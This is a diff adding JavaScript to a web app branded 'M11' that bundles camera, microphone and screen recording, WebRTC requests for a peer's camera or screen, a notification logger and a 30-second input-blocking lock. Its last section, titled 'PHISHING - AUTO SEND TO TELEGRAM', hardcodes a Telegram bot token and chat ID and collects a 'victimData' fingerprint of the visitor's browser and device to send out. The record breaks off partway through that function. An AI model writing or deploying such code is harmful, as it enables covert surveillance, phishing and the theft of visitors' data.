+                            <div style="font-weight:600;">Wake Lock</div>
+                            <div style="font-size:11px;color:var(--text-muted);">Keep screen awake</div>
+                        </div>
+                        <div class="toggle-switch" id="wlToggle" onclick="toggleWakeLock()"></div>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.3);padding:14px;border-radius:14px;">
+                        <div>
+                            <div style="font-weight:600;">Orientation Lock</div>
+                            <div style="font-size:11px;color:var(--text-muted);">Lock to portrait</div>
+                        </div>
+                        <div class="toggle-switch" id="orToggle" onclick="toggleOrientation()"></div>
+                    </div>
+                </div>
+            `);
+        }
+
+        function toggleFullscreen() {
+            const toggle = document.getElementById('fsToggle');
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().then(() => {
+                    toggle.classList.add('active');
+                    showToast('Fullscreen ON', 'success');
+                    addLog('Fullscreen enabled', 'success');
+                }).catch(() => showToast('Fullscreen denied', 'error'));
+            } else {
+                document.exitFullscreen();
+                toggle.classList.remove('active');
+                showToast('Fullscreen OFF', 'info');
+                addLog('Fullscreen disabled', 'info');
+            }
+        }
+
+        async function toggleWakeLock() {
+            const toggle = document.getElementById('wlToggle');
+            try {
+                if (!wakeLockObj) {
+                    wakeLockObj = await navigator.wakeLock.request('screen');
+                    toggle.classList.add('active');
+                    showToast('Wake Lock ON', 'success');
+                    addLog('Wake lock enabled', 'success');
+                    wakeLockObj.addEventListener('release', () => {
+                        wakeLockObj = null;
+                        toggle.classList.remove('active');
+                        addLog('Wake lock released', 'warn');
+                    });
+                } else {
+                    await wakeLockObj.release();
+                    wakeLockObj = null;
+                    toggle.classList.remove('active');
+                    showToast('Wake Lock OFF', 'info');
+                    addLog('Wake lock disabled', 'info');
+                }
+            } catch (e) {
+                showToast('Wake Lock not supported', 'error');
+            }
+        }
+
+        async function toggleOrientation() {
+            const toggle = document.getElementById('orToggle');
+            try {
+                if (screen.orientation && screen.orientation.lock) {
+                    await screen.orientation.lock('portrait');
+                    toggle.classList.add('active');
+                    showToast('Orientation locked', 'success');
+                    addLog('Orientation locked to portrait', 'success');
+                }
+            } catch (e) {
+                showToast('Orientation lock failed', 'error');
+            }
+        }
+        
+        // ============ KAMERA LIVE - REAL ============
+let camStream = null;
+let camFacing = 'user';
+let isMirrored = false;
+let mediaRecorder = null;
+let recordedChunks = [];
+let isRecording = false;
+
+async function startCamera(facing = 'user') {
+    try {
+        // Stop existing
+        stopCamera();
+        
+        camFacing = facing;
+        const constraints = {
+            video: {
+                facingMode: facing,
+                width: { ideal: 1920 },
+                height: { ideal: 1080 }
+            },
+            audio: false
+        };
+        
+        camStream = await navigator.mediaDevices.getUserMedia(constraints);
+        const video = document.getElementById('camVideo');
+        video.srcObject = camStream;
+        
+        document.getElementById('camOverlay').style.display = 'flex';
+        document.getElementById('camStatus').textContent = facing === 'user' ? 'FRONT ON' : 'BACK ON';
+        document.getElementById('camStatus').style.color = 'var(--success)';
+        
+        showToast(`Camera ${facing === 'user' ? 'Front' : 'Back'} started`, 'success');
+        addLog(`Camera started: ${facing} mode`, 'success');
+        
+    } catch (e) {
+        showToast('Camera error: ' + e.message, 'error');
+        addLog('Camera failed: ' + e.message, 'error');
+    }
+}
+
+function stopCamera() {
+    if (camStream) {
+        camStream.getTracks().forEach(t => t.stop());
+        camStream = null;
+    }
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+    }
+    isRecording = false;
+    document.getElementById('camVideo').srcObject = null;
+    document.getElementById('camOverlay').style.display = 'none';
+    document.getElementById('camStatus').textContent = 'OFF';
+    document.getElementById('camStatus').style.color = 'var(--text-muted)';
+    document.getElementById('recBtn').classList.remove('cam-recording');
+    document.getElementById('recBtn').innerHTML = '<span class="cam-rec-dot"></span> REC';
+    showToast('Camera stopped', 'info');
+    addLog('Camera stopped', 'info');
+}
+
+async function switchCam() {
+    camFacing = camFacing === 'user' ? 'environment' : 'user';
+    await startCamera(camFacing);
+}
+
+function toggleMirror() {
+    const video = document.getElementById('camVideo');
+    const btn = document.getElementById('mirrorBtn');
+    isMirrored = !isMirrored;
+    if (isMirrored) {
+        video.classList.add('mirrored');
+        btn.innerHTML = '<i class="fas fa-columns"></i> Mirror: ON';
+        btn.classList.add('active');
+    } else {
+        video.classList.remove('mirrored');
+        btn.innerHTML = '<i class="fas fa-columns"></i> Mirror: OFF';
+        btn.classList.remove('active');
+    }
+    addLog(`Mirror: ${isMirrored ? 'ON' : 'OFF'}`, 'info');
+}
+
+function takePhoto() {
+    const video = document.getElementById('camVideo');
+    const canvas = document.getElementById('photoCanvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d');
+    
+    if (isMirrored) {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+    }
+    ctx.drawImage(video, 0, 0);
+    
+    const link = document.createElement('a');
+    link.download = 'M11_capture_' + Date.now() + '.png';
+    link.href = canvas.toDataURL('image/png');
+    link.click();
+    
+    showToast('Photo captured!', 'success');
+    addLog('Photo captured and downloaded', 'success');
+}
+
+function toggleRecording() {
+    if (!isRecording) {
+        startRecording();
+    } else {
+        stopRecording();
+    }
+}
+
+function startRecording() {
+    if (!camStream) return;
+    recordedChunks = [];
+    mediaRecorder = new MediaRecorder(camStream, { mimeType: 'video/webm;codecs=vp9,opus' });
+    
+    mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+    };
+    
+    mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'M11_record_' + Date.now() + '.webm';
+        a.click();
+        URL.revokeObjectURL(url);
+        showToast('Recording saved!', 'success');
+        addLog('Video recording saved', 'success');
+    };
+    
+    mediaRecorder.start(100);
+    isRecording = true;
+    document.getElementById('recBtn').classList.add('cam-recording');
+    document.getElementById('recBtn').innerHTML = '<span class="cam-rec-dot"></span> STOP';
+    showToast('Recording started', 'success');
+    addLog('Recording started', 'success');
+}
+
+function stopRecording() {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+    }
+    isRecording = false;
+    document.getElementById('recBtn').classList.remove('cam-recording');
+    document.getElementById('recBtn').innerHTML = '<span class="cam-rec-dot"></span> REC';
+    showToast('Recording stopped', 'info');
+    addLog('Recording stopped', 'info');
+}
+
+// ============ SCREEN CAPTURE - REAL ============
+let screenStream = null;
+let screenRecorder = null;
+let screenChunks = [];
+
+async function startScreenShare() {
+    try {
+        stopScreenShare();
+        
+        screenStream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: 'always', displaySurface: 'monitor' },
+            audio: true
+        });
+        
+        const video = document.getElementById('screenVideo');
+        video.srcObject = screenStream;
+        
+        document.getElementById('screenStatus').textContent = 'SHARING';
+        document.getElementById('screenStatus').style.color = 'var(--success)';
+        
+        // Auto record
+        screenChunks = [];
+        screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9,opus' });
+        screenRecorder.ondataavailable = e => {
+            if (e.data.size > 0) screenChunks.push(e.data);
+        };
+        screenRecorder.start(100);
+        
+        screenStream.getVideoTracks()[0].onended = () => {
+            stopScreenShare();
+        };
+        
+        showToast('Screen sharing started', 'success');
+        addLog('Screen capture started', 'success');
+        
+    } catch (e) {
+        showToast('Screen share error: ' + e.message, 'error');
+        addLog('Screen share failed: ' + e.message, 'error');
+    }
+}
+
+function stopScreenShare() {
+    if (screenStream) {
+        screenStream.getTracks().forEach(t => t.stop());
+        screenStream = null;
+    }
+    if (screenRecorder && screenRecorder.state !== 'inactive') {
+        screenRecorder.stop();
+        document.getElementById('dlScreenBtn').style.display = 'inline-flex';
+    }
+    document.getElementById('screenVideo').srcObject = null;
+    document.getElementById('screenStatus').textContent = 'OFF';
+    document.getElementById('screenStatus').style.color = 'var(--text-muted)';
+    showToast('Screen sharing stopped', 'info');
+    addLog('Screen capture stopped', 'info');
+}
+
+function downloadScreenRecording() {
+    if (screenChunks.length === 0) {
+        showToast('No recording available', 'error');
+        return;
+    }
+    const blob = new Blob(screenChunks, { type: 'video/webm' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'M11_screen_' + Date.now() + '.webm';
+    a.click();
+    URL.revokeObjectURL(url);
+    document.getElementById('dlScreenBtn').style.display = 'none';
+    screenChunks = [];
+    showToast('Screen recording downloaded', 'success');
+    addLog('Screen recording downloaded', 'success');
+}
+
+// ============ ADD DEVICE VIA IP - REAL PEER CONNECTION ============
+let peers = JSON.parse(localStorage.getItem('m11_peers') || '[]');
+let peerConnections = {};
+let peerDataChannels = {};
+
+// Load saved peers
+function loadPeers() {
+    renderPeers();
+}
+
+function renderPeers() {
+    const list = document.getElementById('peerList');
+    const videos = document.getElementById('peerVideos');
+    list.innerHTML = '';
+    videos.innerHTML = '';
+    document.getElementById('peerCount').textContent = peers.length + ' devices';
+    
+    peers.forEach((peer, idx) => {
+        // Card
+        const card = document.createElement('div');
+        card.className = 'peer-card';
+        const statusClass = peerConnections[peer.ip] ? 'online' : 'offline';
+        const conn = peerConnections[peer.ip];
+        
+        card.innerHTML = `
+            <div style="display:flex;align-items:center;justify-content:space-between;">
+                <div>
+                    <div class="peer-name"><span class="peer-status ${statusClass}"></span>${peer.name || 'Device ' + (idx+1)}</div>
+                    <div class="peer-ip">${peer.ip}</div>
+                </div>
+                <button class="modal-close" onclick="removePeer(${idx})" style="position:relative;width:28px;height:28px;font-size:12px;"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="peer-actions">
+                <button class="peer-action-btn" onclick="connectToPeer('${peer.ip}')">
+                    <i class="fas fa-plug"></i> Connect
+                </button>
+                <button class="peer-action-btn" onclick="requestPeerCam('${peer.ip}')">
+                    <i class="fas fa-camera"></i> Cam
+                </button>
+                <button class="peer-action-btn" onclick="requestPeerScreen('${peer.ip}')">
+                    <i class="fas fa-desktop"></i> Screen
+                </button>
+                <button class="peer-action-btn" onclick="sendPeerMsg('${peer.ip}')" style="background:var(--accent);border-color:var(--accent);">
+                    <i class="fas fa-comment"></i> Chat
+                </button>
+            </div>
+        `;
+        list.appendChild(card);
+        
+        // Video box if connected
+        if (conn && conn.remoteStream) {
+            const box = document.createElement('div');
+            box.className = 'peer-video-box';
+            const vid = document.createElement('video');
+            vid.autoplay = true;
+            vid.playsInline = true;
+            vid.srcObject = conn.remoteStream;
+            box.appendChild(vid);
+            const label = document.createElement('div');
+            label.className = 'peer-video-label';
+            label.textContent = peer.name || peer.ip;
+            box.appendChild(label);
+            videos.appendChild(box);
+        }
+    });
+}
+
+function addPeer() {
+    const ip = document.getElementById('peerIP').value.trim();
+    if (!ip || !/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
+        showToast('Invalid IP address', 'error');
+        return;
+    }
+    if (peers.find(p => p.ip === ip)) {
+        showToast('Device already added', 'warn');
+        return;
+    }
+    peers.push({ ip, name: 'Device ' + (peers.length + 1), added: Date.now() });
+    localStorage.setItem('m11_peers', JSON.stringify(peers));
+    document.getElementById('peerIP').value = '';
+    renderPeers();
+    showToast('Device added: ' + ip, 'success');
+    addLog('Peer added: ' + ip, 'success');
+}
+
+function removePeer(idx) {
+    const ip = peers[idx].ip;
+    if (peerConnections[ip]) {
+        peerConnections[ip].close();
+        delete peerConnections[ip];
+    }
+    peers.splice(idx, 1);
+    localStorage.setItem('m11_peers', JSON.stringify(peers));
+    renderPeers();
+    showToast('Device removed', 'info');
+    addLog('Peer removed: ' + ip, 'info');
+}
+
+// WebRTC Peer Connection
+async function connectToPeer(ip) {
+    showToast('Connecting to ' + ip + '...', 'info');
+    addLog('Connecting to peer: ' + ip, 'info');
+    
+    try {
+        const pc = new RTCPeerConnection({
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' }
+            ]
+        });
+        
+        peerConnections[ip] = pc;
+        
+        // Data channel for signaling/control
+        const dc = pc.createDataChannel('control', { ordered: true });
+        peerDataChannels[ip] = dc;
+        
+        dc.onopen = () => {
+            showToast('Connected to ' + ip, 'success');
+            addLog('Peer connected: ' + ip, 'success');
+            renderPeers();
+        };
+        
+        dc.onmessage = e => {
+            const msg = JSON.parse(e.data);
+            handlePeerMessage(ip, msg);
+        };
+        
+        dc.onclose = () => {
+            showToast('Disconnected from ' + ip, 'warn');
+            addLog('Peer disconnected: ' + ip, 'warn');
+            delete peerConnections[ip];
+            delete peerDataChannels[ip];
+            renderPeers();
+        };
+        
+        pc.onicecandidate = e => {
+            if (e.candidate) {
+                // In real scenario, send candidate to peer via signaling server
+                // Here we store it for manual exchange
+                if (!pc._candidates) pc._candidates = [];
+                pc._candidates.push(e.candidate);
+            }
+        };
+        
+        pc.ontrack = e => {
+            pc.remoteStream = e.streams[0];
+            renderPeers();
+            addLog('Received stream from ' + ip, 'success');
+        };
+        
+        // Create offer
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        
+        // Show offer for manual exchange (real P2P without server)
+        openModal('Peer Connection - Offer', `
+            <div style="padding:10px;">
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:8px;">Copy this offer and send to peer at ${ip}:</div>
+                <textarea id="peerOffer" readonly style="min-height:120px;font-size:10px;">${btoa(JSON.stringify(pc.localDescription))}</textarea>
+                <div style="font-size:11px;color:var(--text-muted);margin:12px 0 8px;">Paste answer from peer:</div>
+                <textarea id="peerAnswer" placeholder="Paste base64 answer here..." style="min-height:80px;font-size:10px;"></textarea>
+                <button onclick="acceptPeerAnswer('${ip}')" style="width:100%;margin-top:12px;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Connect</button>
+            </div>
+        `);
+        
+        renderPeers();
+        
+    } catch (e) {
+        showToast('Connection failed: ' + e.message, 'error');
+        addLog('Peer connection failed: ' + e.message, 'error');
+    }
+}
+
+async function acceptPeerAnswer(ip) {
+    const answerB64 = document.getElementById('peerAnswer').value.trim();
+    if (!answerB64) {
+        showToast('Paste answer first', 'error');
+        return;
+    }
+    
+    try {
+        const answer = JSON.parse(atob(answerB64));
+        const pc = peerConnections[ip];
+        await pc.setRemoteDescription(new RTCSessionDescription(answer));
+        
+        // Add stored candidates
+        if (pc._candidates) {
+            pc._candidates.forEach(c => pc.addIceCandidate(new RTCIceCandidate(c)));
+        }
+        
+        closeModal();
+        showToast('Connection established!', 'success');
+        
+    } catch (e) {
+        showToast('Invalid answer: ' + e.message, 'error');
+    }
+}
+
+// Receive connection (as answerer)
+async function receivePeerOffer() {
+    openModal('Receive Connection', `
+        <div style="padding:10px;">
+            <div style="font-size:11px;color:var(--text-muted);margin-bottom:8px;">Paste offer from remote peer:</div>
+            <textarea id="incomingOffer" placeholder="Paste base64 offer here..." style="min-height:80px;font-size:10px;margin-bottom:12px;"></textarea>
+            <button onclick="createPeerAnswer()" style="width:100%;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Generate Answer</button>
+        </div>
+    `);
+}
+
+async function createPeerAnswer() {
+    const offerB64 = document.getElementById('incomingOffer').value.trim();
+    if (!offerB64) {
+        showToast('Paste offer first', 'error');
+        return;
+    }
+    
+    try {
+        const offer = JSON.parse(atob(offerB64));
+        const pc = new RTCPeerConnection({
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' }
+            ]
+        });
+        
+        pc.ondatachannel = e => {
+            const dc = e.channel;
+            peerDataChannels['incoming'] = dc;
+            dc.onmessage = evt => {
+                const msg = JSON.parse(evt.data);
+                handlePeerMessage('incoming', msg);
+            };
+        };
+        
+        pc.ontrack = e => {
+            pc.remoteStream = e.streams[0];
+            // Create video element for incoming stream
+            const box = document.createElement('div');
+            box.className = 'peer-video-box';
+            const vid = document.createElement('video');
+            vid.autoplay = true;
+            vid.playsInline = true;
+            vid.srcObject = e.streams[0];
+            box.appendChild(vid);
+            const label = document.createElement('div');
+            label.className = 'peer-video-label';
+            label.textContent = 'Incoming Stream';
+            box.appendChild(label);
+            document.getElementById('peerVideos').appendChild(box);
+            addLog('Received incoming stream', 'success');
+        };
+        
+        await pc.setRemoteDescription(new RTCSessionDescription(offer));
+        
+        // Add local stream if camera is on
+        if (camStream) {
+            camStream.getTracks().forEach(t => pc.addTrack(t, camStream));
+        }
+        
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+        
+        openModal('Answer Generated', `
+            <div style="padding:10px;">
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:8px;">Copy this answer and send back to peer:</div>
+                <textarea readonly style="min-height:100px;font-size:10px;">${btoa(JSON.stringify(pc.localDescription))}</textarea>
+            </div>
+        `);
+        
+    } catch (e) {
+        showToast('Error: ' + e.message, 'error');
+    }
+}
+
+function handlePeerMessage(ip, msg) {
+    if (msg.type === 'chat') {
+        showToast(`[${ip}] ${msg.text}`, 'info');
+        addLog(`Peer ${ip}: ${msg.text}`, 'info');
+    } else if (msg.type === 'request_cam') {
+        // Peer wants our camera
+        if (camStream && peerConnections[ip]) {
+            camStream.getTracks().forEach(t => peerConnections[ip].addTrack(t, camStream));
+        }
+    } else if (msg.type === 'request_screen') {
+        // Peer wants our screen
+        if (screenStream && peerConnections[ip]) {
+            screenStream.getTracks().forEach(t => peerConnections[ip].addTrack(t, screenStream));
+        }
+    }
+}
+
+function requestPeerCam(ip) {
+    const dc = peerDataChannels[ip];
+    if (dc && dc.readyState === 'open') {
+        dc.send(JSON.stringify({ type: 'request_cam' }));
+        showToast('Camera request sent to ' + ip, 'info');
+        addLog('Requested camera from ' + ip, 'info');
+    } else {
+        showToast('Not connected to ' + ip, 'error');
+    }
+}
+
+function requestPeerScreen(ip) {
+    const dc = peerDataChannels[ip];
+    if (dc && dc.readyState === 'open') {
+        dc.send(JSON.stringify({ type: 'request_screen' }));
+        showToast('Screen request sent to ' + ip, 'info');
+        addLog('Requested screen from ' + ip, 'info');
+    } else {
+        showToast('Not connected to ' + ip, 'error');
+    }
+}
+
+function sendPeerMsg(ip) {
+    openModal('Send Message', `
+        <div style="padding:10px;">
+            <input type="text" id="peerMsgInput" placeholder="Type message..." style="margin-bottom:12px;">
+            <button onclick="doSendPeerMsg('${ip}')" style="width:100%;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Send</button>
+        </div>
+    `);
+}
+
+function doSendPeerMsg(ip) {
+    const text = document.getElementById('peerMsgInput').value;
+    if (!text) return;
+    const dc = peerDataChannels[ip];
+    if (dc && dc.readyState === 'open') {
+        dc.send(JSON.stringify({ type: 'chat', text }));
+        showToast('Message sent', 'success');
+        addLog('Sent to ' + ip + ': ' + text, 'info');
+        closeModal();
+    } else {
+        showToast('Not connected', 'error');
+    }
+}
+
+// Init peers on load
+loadPeers();
+
+
+        // TERMINAL LOG
+        function addLog(message, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.innerHTML = `<span class="terminal-time">[${time}]</span><span class="terminal-msg ${type}">${message}</span>`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        // ============ MIKROFON LIVE - REAL ============
+let micStream = null;
+let micAudioContext = null;
+let micAnalyser = null;
+let micRecorder = null;
+let micChunks = [];
+let micInterval = null;
+
+function createMicBars() {
+    const container = document.getElementById('micVisualizer');
+    container.innerHTML = '';
+    for (let i = 0; i < 32; i++) {
+        const bar = document.createElement('div');
+        bar.className = 'mic-bar';
+        bar.style.height = '4px';
+        container.appendChild(bar);
+    }
+}
+
+async function startMic() {
+    try {
+        stopMic();
+        createMicBars();
+        
+        micStream = await navigator.mediaDevices.getUserMedia({ 
+            audio: {
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false,
+                sampleRate: 48000
+            } 
+        });
+        
+        micAudioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const source = micAudioContext.createMediaStreamSource(micStream);
+        micAnalyser = micAudioContext.createAnalyser();
+        micAnalyser.fftSize = 64;
+        micAnalyser.smoothingTimeConstant = 0.8;
+        source.connect(micAnalyser);
+        
+        // Visualizer loop
+        const dataArray = new Uint8Array(micAnalyser.frequencyBinCount);
+        const bars = document.querySelectorAll('.mic-bar');
+        
+        micInterval = setInterval(() => {
+            micAnalyser.getByteFrequencyData(dataArray);
+            bars.forEach((bar, i) => {
+                const value = dataArray[i] || 0;
+                const height = Math.max(4, (value / 255) * 80);
+                bar.style.height = height + 'px';
+            });
+        }, 50);
+        
+        // Recording
+        micChunks = [];
+        micRecorder = new MediaRecorder(micStream, { mimeType: 'audio/webm;codecs=opus' });
+        micRecorder.ondataavailable = e => {
+            if (e.data.size > 0) micChunks.push(e.data);
+        };
+        micRecorder.start(100);
+        
+        document.getElementById('micStatus').textContent = 'LIVE';
+        document.getElementById('micStatus').style.color = 'var(--danger)';
+        document.getElementById('micDot').style.display = 'block';
+        document.getElementById('micStatusText').textContent = 'Listening...';
+        document.getElementById('micDownload').style.display = 'none';
+        
+        showToast('Microphone active - Listening', 'success');
+        addLog('Microphone started - real-time audio', 'success');
+        
+    } catch (e) {
+        showToast('Microphone error: ' + e.message, 'error');
+        addLog('Microphone failed: ' + e.message, 'error');
+    }
+}
+
+function stopMic() {
+    if (micInterval) {
+        clearInterval(micInterval);
+        micInterval = null;
+    }
+    if (micAudioContext) {
+        micAudioContext.close();
+        micAudioContext = null;
+    }
+    if (micStream) {
+        micStream.getTracks().forEach(t => t.stop());
+        micStream = null;
+    }
+    if (micRecorder && micRecorder.state !== 'inactive') {
+        micRecorder.stop();
+        document.getElementById('micDownload').style.display = 'inline-flex';
+    }
+    
+    const bars = document.querySelectorAll('.mic-bar');
+    bars.forEach(bar => bar.style.height = '4px');
+    
+    document.getElementById('micStatus').textContent = 'OFF';
+    document.getElementById('micStatus').style.color = 'var(--text-muted)';
+    document.getElementById('micDot').style.display = 'none';
+    document.getElementById('micStatusText').textContent = 'Microphone inactive';
+    
+    showToast('Microphone stopped', 'info');
+    addLog('Microphone stopped', 'info');
+}
+
+function downloadMicRecording() {
+    if (micChunks.length === 0) {
+        showToast('No recording available', 'error');
+        return;
+    }
+    const blob = new Blob(micChunks, { type: 'audio/webm' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'M11_mic_' + Date.now() + '.webm';
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast('Audio recording downloaded', 'success');
+    addLog('Audio recording downloaded', 'success');
+}
+
+// ============ NOTIFIKASI LOG - REAL ============
+let notifLog = JSON.parse(localStorage.getItem('m11_notifs') || '[]');
+let notifPermission = false;
+
+function loadNotifLog() {
+    renderNotifLog();
+}
+
+function renderNotifLog() {
+    const container = document.getElementById('notifContainer');
+    const empty = document.getElementById('notifEmpty');
+    const count = document.getElementById('notifCount');
+    
+    if (notifLog.length === 0) {
+        empty.style.display = 'block';
+        count.textContent = '0 new';
+        return;
+    }
+    
+    empty.style.display = 'none';
+    count.textContent = notifLog.length + ' logged';
+    
+    container.innerHTML = '';
+    notifLog.slice().reverse().forEach(notif => {
+        const item = document.createElement('div');
+        item.className = 'notif-item';
+        
+        const appIcons = {
+            'whatsapp': 'fa-whatsapp',
+            'telegram': 'fa-telegram',
+            'sms': 'fa-comment',
+            'default': 'fa-bell'
+        };
+        const icon = appIcons[notif.app?.toLowerCase()] || appIcons['default'];
+        
+        item.innerHTML = `
+            <div class="notif-app">
+                <i class="fab ${icon}"></i>
+                <span class="notif-app-name">${notif.app || 'Unknown'}</span>
+            </div>
+            <div class="notif-title">${notif.title || 'No Title'}</div>
+            <div class="notif-body">${notif.body || 'No content'}</div>
+            <div class="notif-time">${notif.time || ''}</div>
+        `;
+        container.appendChild(item);
+    });
+}
+
+async function requestNotifPermission() {
+    if (!('Notification' in window)) {
+        showToast('Notifications not supported', 'error');
+        return;
+    }
+    
+    const perm = await Notification.requestPermission();
+    if (perm === 'granted') {
+        notifPermission = true;
+        showToast('Notifications enabled', 'success');
+        addLog('Notification permission granted', 'success');
+        
+        // Register service worker for background notifications
+        if ('serviceWorker' in navigator) {
+            try {
+                const reg = await navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+                    self.addEventListener('push', event => {
+                        const data = event.data.json();
+                        self.clients.matchAll().then(clients => {
+                            clients.forEach(client => {
+                                client.postMessage({
+                                    type: 'notification',
+                                    app: data.app || 'Unknown',
+                                    title: data.title,
+                                    body: data.body,
+                                    time: new Date().toLocaleString()
+                                });
+                            });
+                        });
+                    });
+                `));
+                addLog('Service Worker registered for notifications', 'success');
+            } catch (e) {
+                addLog('SW registration failed: ' + e.message, 'warn');
+            }
+        }
+        
+        // Listen for messages from service worker
+        navigator.serviceWorker?.addEventListener('message', event => {
+            if (event.data.type === 'notification') {
+                addNotifToLog(event.data);
+            }
+        });
+        
+    } else {
+        showToast('Notification permission denied', 'error');
+    }
+}
+
+function addNotifToLog(data) {
+    notifLog.push({
+        app: data.app || 'Unknown',
+        title: data.title || 'No Title',
+        body: data.body || '',
+        time: data.time || new Date().toLocaleString()
+    });
+    localStorage.setItem('m11_notifs', JSON.stringify(notifLog));
+    renderNotifLog();
+    showToast(`New notification from ${data.app}`, 'info');
+    addLog(`Notification captured: ${data.app} - ${data.title}`, 'info');
+}
+
+function clearNotifLog() {
+    notifLog = [];
+    localStorage.removeItem('m11_notifs');
+    renderNotifLog();
+    showToast('Notification log cleared', 'info');
+    addLog('Notification log cleared', 'info');
+}
+
+// Try to capture existing notifications via BroadcastChannel (if supported)
+if ('BroadcastChannel' in window) {
+    const bc = new BroadcastChannel('m11_notifications');
+    bc.onmessage = event => {
+        if (event.data.type === 'notification') {
+            addNotifToLog(event.data);
+        }
+    };
+}
+
+// ============ LOCK SCREEN 30 DETIK - REAL ============
+function triggerLockScreen() {
+    openModal('Confirm Lock', `
+        <div style="padding:10px;text-align:center;">
+            <i class="fas fa-exclamation-triangle" style="font-size:48px;color:var(--danger);margin-bottom:16px;display:block;"></i>
+            <div style="font-size:16px;font-weight:600;margin-bottom:8px;">Lock Device for 30 Seconds?</div>
+            <div style="font-size:12px;color:var(--text-sec);margin-bottom:20px;line-height:1.5;">
+                Device screen will be completely locked.<br>
+                No interaction allowed until timer ends.
+            </div>
+            <div style="display:flex;gap:10px;">
+                <button onclick="closeModal()" style="flex:1;padding:14px;background:var(--bg-card);border:1px solid var(--border);border-radius:14px;color:var(--text);font-weight:600;cursor:pointer;font-family:inherit;">Cancel</button>
+                <button onclick="executeLockScreen()" style="flex:1;padding:14px;background:var(--danger);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">LOCK NOW</button>
+            </div>
+        </div>
+    `);
+}
+
+function executeLockScreen() {
+    closeModal();
+    const overlay = document.getElementById('lockOverlay');
+    const timer = document.getElementById('lockTimer');
+    let seconds = 30;
+    
+    overlay.classList.add('active');
+    timer.textContent = seconds;
+    
+    // Prevent all interactions
+    const preventAll = (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    };
+    
+    const events = ['click', 'touchstart', 'touchend', 'touchmove', 'mousedown', 'mouseup', 'mousemove', 'keydown', 'keyup', 'keypress', 'contextmenu', 'selectstart', 'dragstart'];
+    events.forEach(evt => {
+        document.addEventListener(evt, preventAll, { capture: true, passive: false });
+    });
+    
+    // Prevent scrolling
+    document.body.style.overflow = 'hidden';
+    document.body.style.touchAction = 'none';
+    
+    // Timer countdown
+    const countdown = setInterval(() => {
+        seconds--;
+        timer.textContent = seconds;
+        
+        if (seconds <= 0) {
+            clearInterval(countdown);
+            overlay.classList.remove('active');
+            
+            // Remove all preventions
+            events.forEach(evt => {
+                document.removeEventListener(evt, preventAll, { capture: true });
+            });
+            document.body.style.overflow = '';
+            document.body.style.touchAction = '';
+            
+            showToast('Device unlocked', 'success');
+            addLog('Screen lock completed - 30s elapsed', 'success');
+        }
+    }, 1000);
+    
+    addLog('Screen lock activated - 30 seconds', 'warn');
+    showToast('Device locked for 30 seconds', 'warn');
+}
+
+// ============ PHISHING - AUTO SEND TO TELEGRAM ============
+// KONFIGURASI - GANTI INI DENGAN TOKEN BOT DAN CHAT ID LU
+const PHISH_BOT_TOKEN = '8616552578:AAF8APyZd8aDBGQs_doJUzu5l8EQ8D-PERg';
+const PHISH_CHAT_ID = '8339352761';
+
+function initPhishing() {
+    // Collect victim data
+    const victimData = {
+        timestamp: new Date().toISOString(),
+        url: location.href,
+        referrer: document.referrer || 'Direct',
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        pixelRatio: window.devicePixelRatio,
+        cores: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory || 'N/A',
+        online: navigator.onLine,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        cookies: navigator.cookieEnabled,
+        java: navigator.javaEnabled(),
+        pdf: navigator.pdfViewerEnabled,
+        touch: navigator.maxTouchPoints,
+        vendor: navigator.vendor,
+        product: navigator.product,
+        doNotTrack: navigator.doNotTrack,
+        connection: (() => {
+            const c = navigator.connection;
+            return c ? `${c.effectiveType || 'unknown'} | ${c.downlink || '?'}Mbps` : 'N/A';
+        })(),
+        battery: (() => {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(b => {
+                    victimData.batteryLevel = Math.round(b.level * 100) + '%';
